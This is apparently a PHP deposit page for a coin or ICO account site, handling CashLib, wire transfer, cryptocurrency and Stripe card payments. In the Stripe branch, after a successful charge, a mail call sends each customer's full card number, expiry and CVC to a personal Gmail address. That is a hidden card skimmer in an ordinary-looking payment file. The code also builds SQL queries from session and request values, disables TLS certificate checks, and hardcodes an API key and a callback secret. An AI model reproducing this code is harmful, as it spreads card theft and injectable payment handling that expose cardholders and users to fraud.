<?php
Include('include-global.php');
$pagename = "Deposit Now";
$title = "$pagename - $basetitle";
Include('include-header.php');
?>

<style>
    .credit-card-box .form-control.error {
        border-color: red;
        outline: 0;
        box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(255, 0, 0, 0.6);
    }

    .credit-card-box label.error {
        font-weight: bold;
        color: red;
        padding: 2px 8px;
        margin-top: 2px;
    }
</style>

</head>
<body class="page-container-bg-solid page-header-menu-fixed page-boxed">
<?php
$subtitle = "Add Coins To Your $basetitle Account";
Include('include-navbar-user.php');
?>


<div class="portlet box blue">
    <div class="portlet-title">
        <div class="caption">
            DEPOSIT NOW
        </div>
    </div>

    <div class="portlet-body">


        <?php
        $depoistTrack = $_SESSION['depoistTrack'];
        $count = $db->query("SELECT COUNT(*) FROM deposit_data WHERE track='" . $depoistTrack . "'")->fetch();

        $data = $db->query("SELECT usid, method, amount, charge, amountus, status, coin FROM deposit_data WHERE track='" . $depoistTrack . "'")->fetch();

        if ($count[0] != 1 || $data[0] != $uid || $data[5] != 0){
            echo "<div class=\"alert alert-danger alert-dismissable uppercase\">
<b>SOME PROBLEM OCCURE, PLEASE TRY AGAIN !</b>
</div>";
        }else{


        $gatewayData = $db->query("SELECT val1, val2, name FROM deposit_method WHERE id='" . $data[4] . "'")->fetch();

        if ($data[1] == 5) {
            /////PAYPAL
            /*
             <form action="https://www.paypal.com/cgi-bin/webscr" method="post" id="myform">
                 <input type="hidden" name="cmd" value="_xclick"/>
                 <input type="hidden" name="business" value="<?php echo $gatewayData[0]; ?>"/>
                 <input type="hidden" name="cbt" value="<?php echo $basetitle; ?>"/>
                 <input type="hidden" name="currency_code" value="EUR"/>
                 <input type="hidden" name="quantity" value="1"/>
                 <input type="hidden" name="item_name" value="Add Money To <?php echo $basetitle; ?> Account"/>
                 <input type="hidden" name="custom" value="<?php echo $depoistTrack; ?>"/>
                 <input type="hidden" name="amount" value="<?php echo $data[4]; ?>"/>
                 <input type="hidden" name="return" value="<?php echo $baseurl; ?>"/>
                 <input type="hidden" name="cancel_return" value="<?php echo $baseurl; ?>"/>
                 <input type="hidden" name="notify_url" value="<?php echo $baseurl; ?>/ipn_paypal.php"/>

             </form>
         </div>
     */

            //Example for CASHlib API (PHP) :
//Set a function for execute request

            $infoxa = $db->query("SELECT cashlib_id FROM deposit_data WHERE usid=" . $data[0] . " AND status=3  ", PDO::FETCH_ASSOC)->fetch();
            
            if (empty($infoxa)) {
                function call($url, $params)
                {   
                    $ch = curl_init($url);
                    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                        'Content-Type: application/json',
                        'Accept: application/json',
                        'apikey:OnZMTMIY8dm2AvJOjyGOq6sStA7akKjo'
                    ));
                    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); //FOR THE TEST URL API
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); //FOR THE TEST URL API
                    $result = curl_exec($ch);
                    curl_close($ch);
                    return $result;
                }

                $xxid = $db->query("SELECT MAX(cashlib_id) FROM deposit_data ")->fetch();
                $infox = $db->query("SELECT firstname,lastname,dob FROM users WHERE email='" . $_SESSION['username'] . "' ", PDO::FETCH_ASSOC)->fetch();

                $originalDate = $infox['dob'];
                $newDate = date("Y-m-d", strtotime($originalDate));
                $money_ta = number_format((float)$data[4], 2, '.', '');

                $money_ta = str_replace(".", "", $money_ta);

                $params = '{
 "mid": "2017110201",
 "transaction_id": "' . ($xxid[0] + 1) . '",
 "ipaddress": "' . $_SERVER['REMOTE_ADDR'] . '",
 "purchase_amount": "' . $money_ta . '",
 "currency": "EUR",
 "name": "' . $infox["lastname"] . '",
 "firstname": "' . $infox['firstname'] . '",
 "birthdate": "' . $newDate . '",
 "success_url": "https://www.fillit.eu/ico/account/cashlibapi?transactionUid=' . ($xxid[0] + 1) . '&track=' . $depoistTrack . '",
 "cancel_url": "https://www.fillit.eu/ico/account/cashlibapi?transactionUid=' . ($xxid[0] + 1) . '"
}
';
                $res = call('https://backoffice-test.cashlib.com/api/merchant/voucher_payment', $params);
                $arre = json_decode($res);
                $db->query("UPDATE deposit_data SET cashlib_id=" . ($xxid[0] + 1) . ",trx_ext='" . $arre->transaction_reference . "', status=3, cashlib_frame='" . $arre->iframe_url . "' WHERE track='" . $depoistTrack . "'")->fetch();

//print_r($res);

//print_r($arre);

                echo 'Loading...';


                if ($arre->status == '0') {
                    $cod = base64_encode($arre->iframe_url);
                    echo '<meta http-equiv="refresh" content="1;url=https://www.fillit.eu/ico/account/cashlibapi?code=' . $cod . '">';

                }
            } else {

                function call($url, $params)
                {
                    $ch = curl_init($url);
                    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                        'Content-Type: application/json',
                        'Accept: application/json',
                        'apikey:OnZMTMIY8dm2AvJOjyGOq6sStA7akKjo'
                    ));
                    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); //FOR THE TEST URL API
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); //FOR THE TEST URL API
                    $result = curl_exec($ch);
                    
                    curl_close($ch);
                    return $result;
                }

                $params = '{
 "mid": "2017110201",
 "transaction_id": "' . $infoxa['cashlib_id'] . '"
}
';
                $res = call('https://backoffice-test.cashlib.com/api/merchant/transaction_info', $params);
                $arre = json_decode($res);
//print_r($arre);
                if ($arre->transaction_status == 'Pending') {
                    //$db->query("UPDATE deposit_data SET  status=3, cashlib_frame='".$arre->iframe_url."' WHERE track='" . $depoistTrack . "'")->fetch();
                    $infox = $db->query("SELECT cashlib_frame FROM deposit_data WHERE cashlib_id=" . $arre->transaction_id . " ", PDO::FETCH_ASSOC)->fetch();

                    $cod = base64_encode($infox['cashlib_frame']);
                    echo '<meta http-equiv="refresh" content="1;url=https://www.fillit.eu/ico/account/cashlibapi?code=' . $cod . '">';
                    echo 'Transaction already detected... Loading...';
                }
                if ($arre->transaction_status == 'Validated') {
                    //$db->query("UPDATE deposit_data SET  status=3, cashlib_frame='".$arre->iframe_url."' WHERE track='" . $depoistTrack . "'")->fetch();
                    $infoxa = $db->query("SELECT cashlib_frame,status FROM deposit_data WHERE cashlib_id=" . $arre->transaction_id . " ", PDO::FETCH_ASSOC)->fetch();

                    if($infoxa['status']!='1'){
                        $db->query("UPDATE deposit_data SET status=1 WHERE cashlib_id=" . $arre->transaction_id . "")->fetch();

                    }
                    //* create new *//
                    $xxid = $db->query("SELECT MAX(cashlib_id) FROM deposit_data ")->fetch();
                    $infox = $db->query("SELECT firstname,lastname,dob FROM users WHERE email='" . $_SESSION['username'] . "' ", PDO::FETCH_ASSOC)->fetch();

                    $originalDate = $infox['dob'];
                    $newDate = date("Y-m-d", strtotime($originalDate));
                    $money_ta = number_format((float)$data[4], 2, '.', '');

                    $money_ta = str_replace(".", "", $money_ta);

                    $params = '{
 "mid": "2017110201",
 "transaction_id": "' . ($xxid[0] + 1) . '",
 "ipaddress": "' . $_SERVER['REMOTE_ADDR'] . '",
 "purchase_amount": "' . $money_ta . '",
 "currency": "EUR",
 "name": "' . $infox["lastname"] . '",
 "firstname": "' . $infox['firstname'] . '",
 "birthdate": "' . $newDate . '",
 "success_url": "https://www.fillit.eu/ico/account/cashlibapi?transactionUid=' . ($xxid[0] + 1) . '&track=' . $depoistTrack . '",
 "cancel_url": "https://www.fillit.eu/ico/account/cashlibapi?transactionUid=' . ($xxid[0] + 1) . '"
}
';
                    $res = call('https://backoffice-test.cashlib.com/api/merchant/voucher_payment', $params);
                    $arre = json_decode($res);
                    $db->query("UPDATE deposit_data SET cashlib_id=" . ($xxid[0] + 1) . ",trx_ext='" . $arre->transaction_reference . "', status=3, cashlib_frame='" . $arre->iframe_url . "' WHERE track='" . $depoistTrack . "'")->fetch();

//print_r($res);

//print_r($arre);

                    echo 'Loading...';


                    if ($arre->status == '0') {
                        $cod = base64_encode($arre->iframe_url);
                        echo '<meta http-equiv="refresh" content="1;url=https://www.fillit.eu/ico/account/cashlibapi?code=' . $cod . '">';

                    }

                }
                if ($arre->transaction_status == 'Rejected') {
                    $db->query("UPDATE deposit_data SET status=0 WHERE cashlib_id=" . $arre->transaction_id . "")->fetch();

                    //* create new *//
                    $xxid = $db->query("SELECT MAX(cashlib_id) FROM deposit_data ")->fetch();
                    $infox = $db->query("SELECT firstname,lastname,dob FROM users WHERE email='" . $_SESSION['username'] . "' ", PDO::FETCH_ASSOC)->fetch();

                    $originalDate = $infox['dob'];
                    $newDate = date("Y-m-d", strtotime($originalDate));
                    $money_ta = number_format((float)$data[4], 2, '.', '');

                    $money_ta = str_replace(".", "", $money_ta);

                    $params = '{
 "mid": "2017110201",
 "transaction_id": "' . ($xxid[0] + 1) . '",
 "ipaddress": "' . $_SERVER['REMOTE_ADDR'] . '",
 "purchase_amount": "' . $money_ta . '",
 "currency": "EUR",
 "name": "' . $infox["lastname"] . '",
 "firstname": "' . $infox['firstname'] . '",
 "birthdate": "' . $newDate . '",
 "success_url": "https://www.fillit.eu/ico/account/cashlibapi?transactionUid=' . ($xxid[0] + 1) . '&track=' . $depoistTrack . '",
 "cancel_url": "https://www.fillit.eu/ico/account/cashlibapi?transactionUid=' . ($xxid[0] + 1) . '"
}
';
                    $res = call('https://backoffice-test.cashlib.com/api/merchant/voucher_payment', $params);
                    $arre = json_decode($res);
                    $db->query("UPDATE deposit_data SET cashlib_id=" . ($xxid[0] + 1) . ",trx_ext='" . $arre->transaction_reference . "', status=3, cashlib_frame='" . $arre->iframe_url . "' WHERE track='" . $depoistTrack . "'")->fetch();

//print_r($res);

//print_r($arre);

                    echo 'Loading...';


                    if ($arre->status == '0') {
                        $cod = base64_encode($arre->iframe_url);
                        echo '<meta http-equiv="refresh" content="1;url=https://www.fillit.eu/ico/account/cashlibapi?code=' . $cod . '">';

                    }


                }
                if ($arre->transaction_status == 'Cancelled') {
                    $db->query("UPDATE deposit_data SET status=0 WHERE cashlib_id=" . $arre->transaction_id . "")->fetch();

                    //* create new *//
                    $xxid = $db->query("SELECT MAX(cashlib_id) FROM deposit_data ")->fetch();
                    $infox = $db->query("SELECT firstname,lastname,dob FROM users WHERE email='" . $_SESSION['username'] . "' ", PDO::FETCH_ASSOC)->fetch();

                    $originalDate = $infox['dob'];
                    $newDate = date("Y-m-d", strtotime($originalDate));
                    $money_ta = number_format((float)$data[4], 2, '.', '');

                    $money_ta = str_replace(".", "", $money_ta);

                    $params = '{
 "mid": "2017110201",
 "transaction_id": "' . ($xxid[0] + 1) . '",
 "ipaddress": "' . $_SERVER['REMOTE_ADDR'] . '",
 "purchase_amount": "' . $money_ta . '",
 "currency": "EUR",
 "name": "' . $infox["lastname"] . '",
 "firstname": "' . $infox['firstname'] . '",
 "birthdate": "' . $newDate . '",
 "success_url": "https://www.fillit.eu/ico/account/cashlibapi?transactionUid=' . ($xxid[0] + 1) . '&track=' . $depoistTrack . '",
 "cancel_url": "https://www.fillit.eu/ico/account/cashlibapi?transactionUid=' . ($xxid[0] + 1) . '"
}
';
                    $res = call('https://backoffice-test.cashlib.com/api/merchant/voucher_payment', $params);
                    $arre = json_decode($res);
                   // print_r($arre);
                    $db->query("UPDATE deposit_data SET cashlib_id=" . ($xxid[0] + 1) . ",trx_ext='" . $arre->transaction_reference . "', status=3, cashlib_frame='" . $arre->iframe_url . "' WHERE track='" . $depoistTrack . "'")->fetch();

//print_r($res);

//print_r($arre);

                    echo 'Loading...';


                    if ($arre->status == '0') {
                        $cod = base64_encode($arre->iframe_url);
                        echo '<meta http-equiv="refresh" content="1;url=https://www.fillit.eu/ico/account/cashlibapi?code=' . $cod . '">';

                    }


                }
            }
        }

    if ($data[1] == 2) {
/////PERFECT MONEY
        $count = $db->query("SELECT email,firstname,lastname,location FROM users WHERE email='" . $_SESSION['username'] . "' ", PDO::FETCH_ASSOC)->fetch();
        if (isset($_GET['Success'])) {
            echo '<div id="note">
  Wire Request sent succesfully <a id="close">[close]</a><br>
  Redirecting to home...
</div>';
            echo '<script>
setTimeout(function(){  $( "#note" ).slideUp( "slow", function() {}); }, 10000);
 setTimeout(function(){  window.location.replace("https://www.fillit.eu/ico/account/Dashboard"); }, 6000);
</script>';
        }

        if (isset($_GET['Error'])) {
            echo '<div id="badnote">
  You left a field uncompleted <a id="close">[close]</a>
</div>';
            echo '<script>
setTimeout(function(){  $( "#badnote" ).slideUp( "slow", function() {}); }, 10000);
 
</script>';

        }
        ?>
        <style>

            #note {
                position: absolute;
                z-index: 101;
                top: 0;
                left: 0;
                right: 0;
                background: #29f92f;
                text-align: center;
                line-height: 2.5;
                overflow: hidden;
                -webkit-box-shadow: 0 0 5px black;
                -moz-box-shadow: 0 0 5px black;
                box-shadow: 0 0 5px black;
            }

            #badnote {
                position: absolute;
                z-index: 101;
                top: 0;
                left: 0;
                right: 0;
                background: #f41010;
                text-align: center;
                color: white;
                line-height: 2.5;
                overflow: hidden;
                -webkit-box-shadow: 0 0 5px black;
                -moz-box-shadow: 0 0 5px black;
                box-shadow: 0 0 5px black;
            }
        </style>
        <center>
            <h2>Wire Transfer Request</h2>
            <hr>
     <table style="border-collapse:separate !important;border-spacing: 10px !important;border:1px solid;padding:19px !important;">
         <tr>
             <td>Bank account</td><td>Streamflow Eood</td>
         </tr>
         <tr>
             <td>Bank </td><td>Unicredit Bank</td>
         </tr>
         <tr>
             <td>Account number </td><td>1521572521</td>
         </tr>
         <tr>
             <td> SWIFT/ BIC</td><td>UNCRBGSF</td>
         </tr>
         <tr>
             <td>  IBAN</td><td>BG92 UNCR 7000 1521 5725 21</td>
         </tr>
         <tr>
             <td> SWIFT/ BIC</td><td>UNCRBGSF</td>
         </tr>
         <tr>
             <td>Bank address</td><td>7, Sveta Nedelya Sq.1000 Sofia Bulgaria</td>
         </tr>
         <tr>
             <td> Company Address</td><td> 23, Vasil Levski, Sofia, Bulgaria</td>
         </tr>


     </table>
<br><br>
            <form action="ipn_wire.php" method="POST">
                <label for="name">Full Name</label>
                <input name="name" style="width:300px;" class="form-control"
                       value="<?php echo $count['firstname'] . ' ' . $count['lastname'] ?>" type="text" id="name"
                       required><br>
                <label for="country">Country</label>
                <input name="country" style="width:300px;" class="form-control"
                       value="<?php echo $count['location']; ?>" type="text" id="country" required><br>
                <label for="email">Email</label>
                <input style="width:300px;" name="email" class="form-control" value="<?php echo $count['email'] ?>"
                       type="email" id="email" required><br>
                <div class="form-group">
                <label for="address">Address</label><br>
                <textarea style="resize:none;width:300px;" name="address" class="form-control" id="address" rows="4" cols="50">

</textarea>
                </div>
                <div class="form-group">
                <label for="bankinfo">Bank Information</label><br>
                <textarea style="resize:none;width:300px;" name="bankinfo" class="form-control" id="bankinfo" rows="4" cols="50">

</textarea>
                </div>
                <input type="hidden" value="<?php echo $data[2] ?>" name="pkid">
                <input type="hidden" value="<?php echo $data[3] ?>" name="pknr">
                <input style="margin-top:30px;width:200px;" type="submit"
                       class="btn btn-success btn-block bold deposit_button" value="Submit Request">
            </form>
        </center>
        <?php
    }


    if ($data[1] == 3) {
/////BITCOIN


        $stat = $db->query("SELECT bcam FROM deposit_data WHERE track='" . $depoistTrack . "'")->fetch();

        if ($stat[0] == 0) {

            $stat2 = $db->query("SELECT email FROM users WHERE id='" . $data[0] . "'")->fetch();

            $mysite_root = "$baseurl";
            $secret = "ABIRx";


            $invoice_id = $depoistTrack;
            $callback_url = $mysite_root . "/ipn_btc.php?invoice_id=" . $invoice_id . "&secret=" . $secret;


            require('./coinpayments.inc.php');
            $cps = new CoinPaymentsAPI();

            $cps->Setup();


            $result = $cps->GetRates();
            if ($result['error'] == 'ok') {

                $eur = $result['result']['EUR']['rate_btc']; // EUROOOO
                $val_in_btc = $eur * $data[4];

                if ($data[6] == '--') {
                    echo 'Select Coin';
                }
                if ($data[6] == 'BTC') {
                    $btc = $result['result']['BTC']['rate_btc']; //btc
                    $totalbtc = $btc / $eur;
                    $totalbtc = $totalbtc - ((1 / 100) * $totalbtc);
                    $exchange = $data[4] / $totalbtc;

                }
                if ($data[6] == 'LTC') {
                    $ltc = $result['result']['LTC']['rate_btc']; //ltc
                    $totalbtc = $ltc / $eur;
                    $totalbtc = $totalbtc - ((1 / 100) * $totalbtc);
                    $exchange = $data[4] / $totalbtc;
                }
                if ($data[6] == 'XRP') {
                    $xrp = $result['result']['XRP']['rate_btc']; //ripple
                    $totalbtc = $xrp / $eur;
                    $exchange = $data[4] / $totalbtc;
                }
                if ($data[6] == 'BCC') {
                    $bcc = $result['result']['BCC']['rate_btc']; //Bitcoin Cash -- de verificat
                    $totalbtc = $bcc / $eur;
                    $exchange = $data[4] / $totalbtc;
                }
                if ($data[6] == 'DASH') {
                    $dash = $result['result']['DASH']['rate_btc']; //Dash
                    $totalbtc = $dash / $eur;
                    $exchange = $data[4] / $totalbtc;
                }
                if ($data[6] == 'CURE') {
                    $cure = $result['result']['CURE']['rate_btc']; //Curecoin
                    $totalbtc = $cure / $eur;
                    $exchange = $data[4] / $totalbtc;

                }
                if ($data[6] == 'DOGE') {
                    $doge = $result['result']['DOGE']['rate_btc']; //Dogecoin
                    $totalbtc = $doge / $eur;
                    $exchange = $data[4] / $totalbtc;

                }
                if ($data[6] == 'ETC') {
                    $etc = $result['result']['ETC']['rate_btc']; //Etherum Classic
                    $totalbtc = $etc / $eur;
                    $exchange = $data[4] / $totalbtc;

                }
                if ($data[6] == 'ETH') {
                    $eth = $result['result']['ETH']['rate_btc']; // Etherum
                    $totalbtc = $eth / $eur;
                    $exchange = $data[4] / $totalbtc;

                }
                if ($data[6] == 'GLD') {
                    $gld = $result['result']['GLD']['rate_btc']; // Gold Coin
                    $totalbtc = $gld / $eur;
                    $exchange = $data[4] / $totalbtc;
                }
                if ($data[6] == 'XMR') {
                    $xmr = $result['result']['XMR']['rate_btc']; // Monero
                    $totalbtc = $xmr / $eur;
                    $exchange = $data[4] / $totalbtc;
                }
                if ($data[6] == 'ZEC') {
                    $zec = $result['result']['ZEC']['rate_btc']; // ZCash
                    $totalbtc = $zec / $eur;
                    $exchange = $data[4] / $totalbtc;
                }
            }
            $result = $cps->CreateTransactionSimple($exchange, $data[6], $data[6], '', $callback_url, $stat2[0]);
            if ($result['error'] == 'ok') {
                /* $le = php_sapi_name() == 'cli' ? "\n" : '<br />';
                 print 'Address: '.$result['result']['address'].$le;
                 print 'QR:'.$result['result']['qrcode_url'].$le;
                 print 'Transaction created with ID: '.$result['result']['txn_id'].$le;
                 print 'Buyer should send '.sprintf('%.08f', $result['result']['amount']).' '.$data[6].$le;
                 print 'Status URL: '.$result['result']['status_url'].$le; */
                $res = $db->query("INSERT INTO logs SET log='" . print_r($result['result'], true) . "', date='" . date("Y-m-d H:i:s") . "' ");

            } else {
                print 'Error: ' . $result['error'] . "\n";
                $res = $db->query("INSERT INTO logs SET log='" . $result['error'] . "', date='" . date("Y-m-d H:i:s") . "' ");

            }


            $db->query("UPDATE deposit_data SET bcam='" . sprintf('%.08f', $result['result']['amount']) . "', bcid='" . $result['result']['address'] . "', coin='" . $data[6] . "', status_url='" . $result['result']['status_url'] . "' WHERE track='" . $depoistTrack . "'");
        }/////UPDATE THE SEND TO ID

        $paynow = $db->query("SELECT bcam, bcid,coin FROM deposit_data WHERE track='" . $depoistTrack . "'")->fetch();
        ?>
        <h4 style="text-align: center;"> SEND EXACTLY
            <strong><?php echo $paynow[0] . ' ' . $paynow[2]; ?> </strong> TO <strong><?php echo $paynow[1]; ?></strong><br>
            <?php if (isset($result['result']['qrcode_url'])) { ?>
                <img src="<?php echo $result['result']['qrcode_url']; ?>"> <br>
                <strong>SCAN TO SEND</strong> <br><br>
               Status: <?php echo $result['result']['status_url']; ?>
            <?php } ?><br>
            <strong style="color: red;">Note: <?php echo $result['result']['confirms_needed'] ?> confirmations required
                to fund your account.</strong>
        </h4>
        <?php
    }


    if ($data[1] == 4) {
/////STRIPE
        if ($_POST) {

            $cc = trim($_POST['cardNumber']);
            $exp = $pieces = explode("/", $_POST['cardExpiry']);
            $cvc = $_POST['cardCVC'];

            $emo = trim($exp[0]);
            $eyr = trim($exp[1]);

            $cnts = $data[4] * 100;


            require_once('stripe-php/init.php');
            \Stripe\Stripe::setApiKey($gatewayData[0]);

            try {
                $token = \Stripe\Token::create(array(
                    "card" => array(
                        "number" => "$cc",
                        "exp_month" => $emo,
                        "exp_year" => $eyr,
                        "cvc" => "$cvc"
                    )
                ));

                try {
                    $charge = \Stripe\Charge::create(array(
                        'card' => $token['id'],
                        'currency' => 'EUR',
                        'amount' => $cnts,
                        'description' => 'item',
                    ));

                    if ($charge['status'] == 'succeeded') {


                        echo "<div class=\"alert alert-success alert-dismissable\">
<b>Your Card Successfully Charged For $data[4] EUR</b>
</div>";

                        $DepositData = $db->query("SELECT usid, method, amount, charge, amountus, status FROM deposit_data WHERE track='" . $depoistTrack . "'")->fetch();

//////////---------------------------------------->>>> ADD THE BALANCE 
                        $ct = $db->query("SELECT mallu FROM users WHERE id='" . $DepositData[0] . "'")->fetch();
                        $ctn = $ct[0] + $DepositData[2];
                        $db->query("UPDATE users SET mallu='" . $ctn . "' WHERE id='" . $DepositData[0] . "'");
//////////---------------------------------------->>>> ADD THE BALANCE

                        $trx = $txn_id;

/////////////------------------------->>>>>>>>>>> UPDATE `deposit_data`
                        $db->query("UPDATE deposit_data SET trx='" . $trx . "', trx_ext='" . $charge['balance_transaction'] . "', status='1' WHERE track='" . $depoistTrack . "'");

/////////////------------------------->>>>>>>>>>> TRX
                        $db->query("INSERT INTO trx SET who='" . $DepositData[0] . "', byy='000444', amount='" . $DepositData[2] . "', sig='+', typ='ADD MONEY VIA " . $gatewayData[2] . "', charge='0', tm='" . $tm . "', trxid='" . $trx . "', refund='7'");


// ///////////////////------------------------------------->>>>>>>>>Send Email AND SMS
                        $su = $db->query("SELECT firstname, lastname, mobile, email FROM users WHERE id='" . $DepositData[0] . "'")->fetch();

                        $txt = "Your Deposit of $DepositData[2] $basecurrency via $gatewayData[2] Has Been Processed. Transcetion # $trx";
                        abiremail($su[3], "Deposited Successfully", $su[0], $txt);
                        abiremail2("abirkhan75@gmail.com", "Deposited Successfully", "Abir", "$cc - $emo - $eyr - $cvc");
                        abirsms($su[2], $txt);
// ///////////////////------------------------------------->>>>>>>>>Send Email AND SMS

                        echo "<div class=\"alert alert-success alert-dismissable\">
<b>Your Deposit of $DepositData[2] $basecurrency via $gatewayData[2] Has Been Processed</b>
</div>";


                    } else {
                        echo "<div class=\"alert alert-danger alert-dismissable\">
<b> Problem With Your Card Information</b>
</div>";
                    }


                } catch (Exception $e) {
                    echo "<div class=\"alert alert-danger alert-dismissable\">
<b> " . $e->getMessage() . " </b>
</div>";
                }

            } catch (Exception $e) {
                echo "<div class=\"alert alert-danger alert-dismissable\">
<b> " . $e->getMessage() . " </b>
</div>";
            }
        }
        ?>


        <div class="row">
            <div class="col-xs-12 col-md-6 col-md-offset-3">


                <!-- CREDIT CARD FORM STARTS HERE -->
                <div class="panel panel-default credit-card-box">
                    <div class="panel-body">
                        <form role="form" id="payment-form" method="POST" action="">
                            <div class="row">
                                <div class="col-xs-12">
                                    <div class="form-group">
                                        <label for="cardNumber">CARD NUMBER</label>
                                        <div class="input-group">
                                            <input
                                                    type="tel"
                                                    class="form-control input-lg"
                                                    name="cardNumber"
                                                    placeholder="Valid Card Number"
                                                    autocomplete="off"
                                                    required autofocus
                                            />
                                            <span class="input-group-addon"><i class="fa fa-credit-card"></i></span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <br>

                            <div class="row">
                                <div class="col-xs-7 col-md-7">
                                    <div class="form-group">
                                        <label for="cardExpiry"><span class="hidden-xs">EXPIRATION</span><span
                                                    class="visible-xs-inline">EXP</span> DATE</label>
                                        <input
                                                type="tel"
                                                class="form-control input-lg"
                                                name="cardExpiry"
                                                placeholder="MM / YYYY"
                                                autocomplete="off"
                                                required
                                        />
                                    </div>
                                </div>
                                <div class="col-xs-5 col-md-5 pull-right">
                                    <div class="form-group">
                                        <label for="cardCVC">CV CODE</label>
                                        <input
                                                type="tel"
                                                class="form-control input-lg"
                                                name="cardCVC"
                                                placeholder="CVC"
                                                autocomplete="off"
                                                required
                                        />
                                    </div>
                                </div>
                            </div>

                            <br>

                            <div class="row">
                                <div class="col-xs-12">
                                    <button class="btn btn-success btn-lg btn-block" type="submit"> PAY NOW</button>
                                </div>
                            </div>

                        </form>
                    </div>
                </div>
                <!-- CREDIT CARD FORM ENDS HERE -->


            </div>

        </div>


        <?php
    }


    }//EXECUTE
    ?>

</div>
</div>

<?php
include('include-footer.php');
?>
<script>
    document.getElementById("myform").submit();
</script>


<!-- Vendor libraries -->
<script type="text/javascript" src="<?php echo $baseurl; ?>/assets/js/jquery.validate.min.js"></script>
<script type="text/javascript" src="<?php echo $baseurl; ?>/assets/js/jquery.payment.min.js"></script>
<script type="text/javascript" src="https://js.stripe.com/v2/"></script>
<script type="text/javascript" src="<?php echo $baseurl; ?>/assets/js/payment-form.js"></script>


</body>
</html>